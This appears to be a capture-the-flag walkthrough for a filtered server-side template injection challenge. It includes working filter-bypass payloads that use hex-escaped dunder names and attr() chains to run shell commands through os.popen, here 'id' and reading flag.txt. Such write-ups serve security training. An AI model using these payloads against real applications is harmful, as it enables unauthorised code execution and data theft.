1. Visit the application in a web browser
2. Notice that the input is vulnerable to a Server Side Template Injection (SSTI) vulnerability but the input appears to be filtered. This can be checked by the following payloads
  * `{{8*8}}` => 88
  * asd{}asd => asd{}asd
3. The above payloads confirm that there are elements being filtered because the `*` was stripped from the first payload and the payload was consumed as a template variable as the brackets were not output. However, the second payload was output as is, because the brackets are not filtered, and an instance of single brackets does not get consumed as a template variable
4. Code execution can be achieved in multiple ways, for example the following payload
  * `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`
5. Flag can then be read, e.g.
  * `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat\x20flag\x2etxt')|attr('read')()}}`
